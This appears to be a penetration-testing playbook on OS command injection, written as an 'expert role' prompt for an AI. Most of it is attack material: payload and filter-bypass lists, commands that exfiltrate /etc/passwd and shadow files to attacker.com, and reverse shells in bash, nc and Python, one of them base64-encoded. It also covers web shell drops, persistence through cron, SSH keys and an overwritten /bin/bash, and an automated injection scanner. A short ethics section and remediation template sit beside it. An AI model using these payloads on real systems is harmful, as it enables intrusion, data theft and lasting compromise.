# 16 - Command Injection Automation

## Expert Role
You are a senior penetration tester specializing in OS command injection. You have identified command injection vulnerabilities in critical infrastructure, financial systems, and SaaS platforms. You understand how different languages, frameworks, and operating systems handle command execution.

## Core Concepts
- Command injection occurs when user input is passed to system shell commands
- Blind injection requires time-based or out-of-band detection
- Different separators work on different OS (Linux vs Windows)
- Encoding and filtering bypass are common defense mechanisms
- Chained commands enable data exfiltration and RCE
- WAF detection and bypass is essential for automated testing

## Prerequisites
1. Understanding of shell syntax (bash, sh, cmd, PowerShell)
2. Knowledge of command separators (;, &&, ||, |, backticks, $())
3. Familiarity with different programming language exec functions
4. Understanding of input sanitization and filtering
5. Knowledge of OS-specific payloads (Linux vs Windows)
6. Understanding of out-of-band detection techniques
7. Familiarity with WAF command injection signatures
8. Knowledge of filter bypass encoding techniques
9. Understanding of network-level command execution (curl, wget, nc)
10. Knowledge of blind injection detection methods

## Methodology

### Step 1: Identify Injection Points
```
# Common injection points
- URL parameters (?cmd=id)
- Form fields (search, query, ping, hostname)
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Cookie values
- File upload filenames
- API parameters

# Discovery commands
grep -rn "exec\|system\|passthru\|shell_exec\|popen\|proc_open" --include="*.php" .
grep -rn "subprocess\|os.system\|os.popen\|eval(" --include="*.py" .
grep -rn "child_process\|execSync\|spawn" --include="*.js" .
grep -rn "Runtime.getRuntime\|ProcessBuilder" --include="*.java" .

# Nuclei templates
nuclei -u https://target.com -t /path/to/nuclei-templates/cmd-injection/
```

### Step 2: Test Basic Injection
```bash
# Linux separators
;id
|id
||id
&&id
`id`
$(id)
%0a id
%0d%0a id
; id
| id
|| id
&& id

# Windows separators
|whoami
&whoami
&&whoami
||whoami
;whoami
`whoami`
$(whoami)

# Test all parameters
# For each parameter in the request, inject:
param=value;id
param=value|id
param=value`id`
param=value$(id)

# URL encode when needed
param=value%3Bid
param=value%7Cid
param=value%60id%60
param=value%24(id)
```

### Step 3: Test Blind Injection
```bash
# Time-based detection
;sleep 5
|sleep 5
||sleep 5
&&sleep 5
`sleep 5`
$(sleep 5)
%0asleep 5

# Windows time-based
|ping -n 5 127.0.0.1
|timeout /t 5
&ping -n 5 127.0.0.1

# Out-of-band detection
;nslookup attacker.com
|nslookup attacker.com
;curl http://attacker.com/$(whoami)
|curl http://attacker.com/$(whoami)
;wget http://attacker.com/$(whoami)
|wget http://attacker.com/$(whoami)

# DNS-based detection
;dig attacker.com
|dig attacker.com
;host attacker.com
|host attacker.com

# HTTP-based detection
;curl http://attacker.com?data=$(whoami)
|curl http://attacker.com?data=$(whoami)
;wget http://attacker.com?data=$(whoami)
|wget http://attacker.com?data=$(whoami)
```

### Step 4: Test Filter Bypass
```bash
# Space bypass
{id}
{id}
$IFS
${IFS}
%09
%20
cat${IFS}/etc/passwd
cat${IFS}/etc/passwd
cat${IFS}/etc/passwd

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
cat /etc/pas??d
cat /etc/pas*
cat$((1))/etc/passwd
/bin/ca? /etc/passwd
/usr/bin/cat /etc/passwd

# Character bypass
cat /etc/passwd
c\at /etc/passwd
ca''t /etc/passwd
ca""t /etc/passwd
cat /etc/p[a]sswd

# Encoding bypass
echo "aWQ=" | base64 -d | bash
$(echo "aWQ=" | base64 -d)
`echo "aWQ=" | base64 -d`
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ== | base64 -d | bash"

# Alternative commands
id
whoami
uname -a
cat /etc/passwd
cat /etc/shadow (requires root)
ls -la /
```

### Step 5: Test OS-Specific Payloads
```bash
# Linux payloads
;id
|id
;cat /etc/passwd
|cat /etc/passwd
;ls -la /
|ls -la /
;uname -a
|uname -a
;whoami
|whoami

# Windows payloads
|whoami
|ipconfig
|dir
|type C:\Windows\System32\drivers\etc\hosts
|net user
|net localgroup administrators
|systeminfo
|tasklist

# macOS payloads
;id
|id
;whoami
|whoami
;sw_vers
|sw_vers

# Python-specific
__import__('os').popen('id').read()
;python -c "import os;os.system('id')"
|python -c "import os;os.system('id')"

# PHP-specific
;php -r "echo shell_exec('id');"
|php -r "echo shell_exec('id');"

# Node.js-specific
;node -e "require('child_process').execSync('id')"
|node -e "require('child_process').execSync('id')"
```

### Step 6: Test WAF Bypass
```bash
# Double encoding
%253B id
%257C id
%2526%2526 id

# Unicode encoding
%u003B id
%u007C id
%u0026%u0026 id

# Case variation
;ID
|Id
;WhoAmI

# Whitespace variation
;id
; id
;%09id
;%0aid
;%0d%0aid

# Alternative separators
%0a id
%0d id
%0d%0a id
%00 id

# Comment injection
;/*id*/
;id/**/
|id/**/

# Inline comment
;id;#
|id;#
;id;//
|id;//

# Backtick bypass
`id`
\\`id\\`
\`id\`

# Dollar sign bypass
$(id)
$((1+1))id
${id}
```

### Step 7: Test Multi-Stage Injection
```bash
# Data exfiltration via DNS
;curl http://attacker.com/$(cat /etc/passwd | base64)
|curl http://attacker.com/$(cat /etc/passwd | base64)
;wget http://attacker.com/$(whoami)
|wget http://attacker.com/$(whoami)

# Reverse shell
;bash -i >& /dev/tcp/attacker.com/4444 0>&1
|bash -i >& /dev/tcp/attacker.com/4444 0>&1
;nc -e /bin/bash attacker.com 4444
|nc -e /bin/bash attacker.com 4444

# File write
;echo "shell" > /var/www/html/shell.php
|echo "shell" > /var/www/html/shell.php
;wget http://attacker.com/shell.php -O /var/www/html/shell.php
|wget http://attacker.com/shell.php -O /var/www/html/shell.php

# Credential harvesting
;cat /etc/passwd
|cat /etc/passwd
;cat /etc/shadow
|cat /etc/shadow
;find / -name "*.conf" -exec cat {} \;
|find / -name "*.conf" -exec cat {} \;
```

### Step 8: Automate Detection
```python
#!/usr/bin/env python3
"""Automated command injection scanner"""

import requests
import time
import sys
from urllib.parse import urljoin, urlencode

class CommandInjectionScanner:
    def __init__(self, url: str, method: str = "GET", headers: dict = None):
        self.url = url
        self.method = method.upper()
        self.headers = headers or {}
        self.session = requests.Session()
        self.vulns = []

    def test_injection(self, param: str, value: str, payload: str, detection: str = "response"):
        """Test a single injection payload"""
        test_value = value + payload

        if self.method == "GET":
            params = {param: test_value}
            start_time = time.time()
            resp = self.session.get(self.url, params=params, headers=self.headers, timeout=10)
            elapsed = time.time() - start_time
        else:
            data = {param: test_value}
            start_time = time.time()
            resp = self.session.post(self.url, data=data, headers=self.headers, timeout=10)
            elapsed = time.time() - start_time

        if detection == "response":
            # Check if command output appears in response
            indicators = ["uid=", "root:", "www-data", "apache", "nginx"]
            for indicator in indicators:
                if indicator in resp.text:
                    self.vulns.append({
                        "type": "Command Injection (Reflected)",
                        "param": param,
                        "payload": payload,
                        "evidence": indicator,
                        "status": resp.status_code
                    })
                    return True

        elif detection == "time":
            # Check if response time indicates injection
            if elapsed >= 4.5:  # 5 second sleep
                self.vulns.append({
                    "type": "Command Injection (Blind - Time)",
                    "param": param,
                    "payload": payload,
                    "elapsed": elapsed,
                    "status": resp.status_code
                })
                return True

        return False

    def test_blind_injection(self, param: str, value: str):
        """Test for blind command injection using time delays"""
        payloads = [
            (";sleep 5", "linux"),
            ("|sleep 5", "linux"),
            ("||sleep 5", "linux"),
            ("&&sleep 5", "linux"),
            ("$(sleep 5)", "linux"),
            ("`sleep 5`", "linux"),
            ("|ping -n 5 127.0.0.1", "windows"),
            ("&ping -n 5 127.0.0.1", "windows"),
            ("&&ping -n 5 127.0.0.1", "windows"),
            ("||ping -n 5 127.0.0.1", "windows"),
        ]

        for payload, os_type in payloads:
            if self.test_injection(param, value, payload, "time"):
                return True
        return False

    def test_oob_injection(self, param: str, value: str, callback_url: str):
        """Test for out-of-band command injection"""
        payloads = [
            f";nslookup {callback_url}",
            f"|nslookup {callback_url}",
            f";dig {callback_url}",
            f"|dig {callback_url}",
            f";curl {callback_url}",
            f"|curl {callback_url}",
            f";wget {callback_url}",
            f"|wget {callback_url}",
        ]

        for payload in payloads:
            self.test_injection(param, value, payload, "response")

    def test_filter_bypass(self, param: str, value: str):
        """Test filter bypass techniques"""
        bypasses = [
            "';id;'",           # Quote injection
            '"id"',             # Double quote
            "id$",              # Dollar sign
            "$(id)",            # Command substitution
            "`id`",             # Backticks
            "id${IFS}",         # IFS bypass
            "{id}",             # Brace expansion
            "id%09",            # Tab bypass
            "id%0a",            # Newline bypass
            "id/**/",           # Comment bypass
        ]

        for bypass in bypasses:
            self.test_injection(param, value, ";" + bypass, "response")

    def run_all(self, params: dict, callback_url: str = None):
        """Run all injection tests"""
        print(f"[*] Testing command injection on: {self.url}")

        for param, value in params.items():
            print(f"\n[*] Testing parameter: {param}")

            # Test basic injection
            basic_payloads = [";id", "|id", "||id", "&&id", "`id`", "$(id)"]
            for payload in basic_payloads:
                if self.test_injection(param, value, payload, "response"):
                    print(f"  [+] Found injection with: {payload}")

            # Test blind injection
            if self.test_blind_injection(param, value):
                print(f"  [+] Found blind injection")

            # Test filter bypass
            self.test_filter_bypass(param, value)

        print(f"\n[*] Total vulnerabilities found: {len(self.vulns)}")
        return self.vulns

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <param1=value1,param2=value2>")
        sys.exit(1)

    url = sys.argv[1]
    params_dict = dict(item.split("=") for item in sys.argv[2].split(","))

    scanner = CommandInjectionScanner(url)
    scanner.run_all(params_dict)
```

## Tool Arsenal

### Injection Testing Tools
```bash
# commix - Automated command injection exploitation
python commix.py --url="https://target.com/?cmd=FUZZ" --data="cmd=FUZZ"

# Burp Suite - Manual testing with Repeater
# Inject payloads in each parameter and analyze responses

# curl - Manual testing
curl "https://target.com/?cmd=id"
curl "https://target.com/?cmd=;id"
curl "https://target.com/?cmd=|id"

# Nuclei - Template-based testing
nuclei -u https://target.com -t cmd-injection/

# wfuzz - Fuzzing
wfuzz -c -z file,payloads.txt --hc 404 "https://target.com/?cmd=FUZZ"

# SQLmap - Can detect OS command injection
sqlmap -u "https://target.com/?cmd=test" --os-cmd="id"

# Metasploit - Auxiliary modules
use auxiliary/scanner/http/os_command_injection
```

### Payload Generation
```bash
# Linux payloads
;id
|id
;cat /etc/passwd
|cat /etc/passwd
;ls -la /
|ls -la /
;whoami
|whoami
;uname -a
|uname -a

# Windows payloads
|whoami
|ipconfig
|dir
|type C:\Windows\System32\drivers\etc\hosts
|net user
|net localgroup administrators
|systeminfo
|tasklist

# Reverse shell payloads
;bash -i >& /dev/tcp/attacker.com/4444 0>&1
|bash -i >& /dev/tcp/attacker.com/4444 0>&1
;nc -e /bin/bash attacker.com 4444
|nc -e /bin/bash attacker.com 4444
;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Filter Bypass Payloads
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$((1))/etc/passwd
cat$'\x20'/etc/passwd
< /etc/passwd
cat</etc/passwd

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
cat /etc/pas??d
cat /etc/pas*
/bin/ca? /etc/passwd
/usr/bin/cat /etc/passwd

# Character bypass
cat /etc/passwd
c\at /etc/passwd
ca''t /etc/passwd
ca""t /etc/passwd
cat /etc/p[a]sswd
cat /etc/p[a]sswd

# Encoding bypass
echo "aWQ=" | base64 -d | bash
$(echo "aWQ=" | base64 -d)
`echo "aWQ=" | base64 -d`
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ== | base64 -d | bash"
```

## Case Studies

### Case Study 1: Basic Injection in Ping Utility
**Target**: Network monitoring tool with ping functionality
**Parameter**: `host=8.8.8.8`
**Payload**: `host=8.8.8.8;id`
**Result**: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
**Impact**: Full RCE, customer data exfiltration
**Root Cause**: Unsanitized input passed to `exec("ping -c 4 " + host)`

### Case Study 2: Blind Injection with Time Delay
**Target**: SaaS analytics platform
**Parameter**: `domain=example.com`
**Payload**: `domain=example.com;sleep 5`
**Result**: 5-second delay confirms blind injection
**Exploitation**: Used DNS exfiltration to extract database credentials
**Impact**: Full database compromise

### Case Study 3: Filter Bypass via Encoding
**Target**: Enterprise security tool
**Filter**: Blocks `;`, `|`, `&&`, `||`
**Bypass**: `%0a id` (newline character)
**Result**: Command execution bypassing WAF
**Impact**: RCE on security monitoring system

### Case Study 4: Multi-Stage Exploitation
**Target**: Cloud management platform
**Initial**: Blind injection in search parameter
**Stage 1**: Used DNS exfiltration to map internal network
**Stage 2**: Used SSRF to access cloud metadata
**Stage 3**: Extracted IAM credentials from metadata
**Stage 4**: Used credentials to access S3 buckets
**Impact**: Full cloud environment compromise

### Case Study 5: Windows Command Injection
**Target**: Windows-based file server
**Parameter**: `filename=test.txt`
**Payload**: `filename=test.txt|whoami`
**Result**: `nt authority\system`
**Exploitation**: Used PowerShell to download and execute reverse shell
**Impact**: Domain admin compromise

### Case Study 6: Python Web Application
**Target**: Django-based web application
**Parameter**: `query=test`
**Payload**: `query=test;__import__('os').popen('id').read()`
**Result**: Command execution via Python eval
**Impact**: Server compromise, source code access

## Bypass Techniques

### WAF Bypass Table
| Technique | Payload | Bypasses |
|-----------|---------|----------|
| Double encoding | %253B%2520id | URL encoding WAF |
| Unicode | %u003B%u0020id | Unicode-aware WAF |
| Case variation | ;ID | Case-sensitive WAF |
| Whitespace | ;%09id | Whitespace filtering |
| Comments | ;id/**/ | Pattern matching |
| Newline | %0aid | Line-based filtering |
| Null byte | ;id%00 | String termination |

### Filter Bypass Table
| Filter | Bypass | Technique |
|--------|--------|-----------|
| Spaces | ${IFS} | Internal Field Separator |
| Spaces | {cmd,arg} | Brace expansion |
| Spaces | %09 | Tab character |
| Semicolons | \| | Pipe operator |
| Pipes | && | And operator |
| Keywords | c'a't | Quote insertion |
| Keywords | /bin/ca? | Glob expansion |
| Keywords | $(cmd) | Command substitution |

## Advanced Techniques

### Chained Exploitation
```bash
# 1. Initial injection: ;id
# 2. Write reverse shell: ;echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > /tmp/shell.sh
# 3. Execute reverse shell: ;bash /tmp/shell.sh
# 4. Pivot to internal network using compromised host
```

### Container Escape
```bash
# Check if in container
;cat /proc/1/cgroup
|cat /proc/1/cgroup

# Escape container
;ls -la /.dockerenv
|ls -la /.dockerenv

# Mount host filesystem
;mount /dev/sda1 /mnt
|mount /dev/sda1 /mnt
```

### Persistence Mechanism
```bash
# Add cron job
;echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/crontab
|echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/crontab

# Add SSH key
;mkdir -p ~/.ssh && echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
|mkdir -p ~/.ssh && echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Modify system binary
;cp /bin/bash /bin/bash.bak && echo "#!/bin/bash" > /bin/bash && echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /bin/bash
```

## Detection Indicators
- Application responds differently to injected commands
- Time delays when using sleep/timeout payloads
- Error messages containing command output
- DNS/HTTP requests to external servers during testing
- Unusual response sizes or content types
- Application logs containing injected commands

## Impact Assessment
- **Critical**: Direct command execution with output visible
- **High**: Blind command execution with time-based confirmation
- **Medium**: Limited command execution with filtered output
- **Low**: Command injection in non-sensitive context

## Common Pitfalls
1. Only testing reflected injection (missing blind)
2. Not testing all input parameters
3. Ignoring HTTP headers as injection points
4. Not considering OS differences (Linux vs Windows)
5. Forgetting about filter bypass techniques
6. Not testing with different user contexts
7. Missing multi-stage exploitation opportunities
8. Not verifying with out-of-band techniques
9. Assuming WAF provides complete protection
10. Not documenting all injection points found

## Integration Points
- Pairs with 08-File-Upload for post-upload RCE
- Pairs with 14-SSRF for internal network pivoting
- Pairs with 30-Tool-Chaining for automated exploitation pipelines
- Pairs with Advanced-Persistence for maintaining access

## Reporting Template
```
## OS Command Injection

### Summary
The application passes unsanitized user input to system commands, allowing
an attacker to execute arbitrary operating system commands.

### Affected Endpoint
[METHOD] [URL]
Parameter: [param]
Payload: [payload]

### Reproduction Steps
1. Navigate to [URL]
2. Enter [payload] in [parameter]
3. Observe: [command output / time delay / OOB callback]

### Impact
- Full Remote Code Execution
- Data Exfiltration
- Server Compromise
- Lateral Movement

### Remediation
1. Never pass user input to system commands
2. Use language-specific APIs instead of shell commands
3. Implement input validation with strict whitelist
4. Use parameterized commands where available
5. Apply principle of least privilege
```

## Practice Labs
1. Test command injection on DVWA command injection page
2. Practice blind injection on PortSwigger Web Security Academy
3. Build automated command injection scanner
4. Practice filter bypass techniques on HackTheBox
5. Test multi-stage exploitation on VulnHub machines

## Ethics
- Only test on authorized systems
- Use non-destructive payloads (id, whoami, not rm -rf)
- Document all injection points for responsible disclosure
- Report vulnerabilities through proper channels
- Never access data beyond what's needed to prove impact

## Quick Reference
| Separator | Linux | Windows |
|-----------|-------|---------|
| Semicolon | ; | ; |
| Pipe | \| | \| |
| And | && | && |
| Or | \|\| | \|\| |
| Backtick | `cmd` | `cmd` |
| Dollar | $(cmd) | $(cmd) |
| Newline | %0a | %0a |
